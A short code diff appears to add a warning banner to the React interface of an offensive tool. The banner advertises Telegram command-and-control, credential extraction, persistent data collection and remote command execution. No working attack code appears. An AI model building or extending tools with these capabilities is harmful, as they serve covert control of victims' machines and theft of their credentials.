+        <AlertTriangle className="h-4 w-4" />
+        <AlertDescription className="text-matrix">
+          <strong>Enhanced Capabilities:</strong> All tools now feature real-time Telegram C2 integration, 
+          advanced credential extraction, persistent data collection, and comprehensive network analysis. 
+          Configure Telegram for immediate operational alerts and remote command execution.
+        </AlertDescription>
+      </Alert>
     </div>
   );
 }
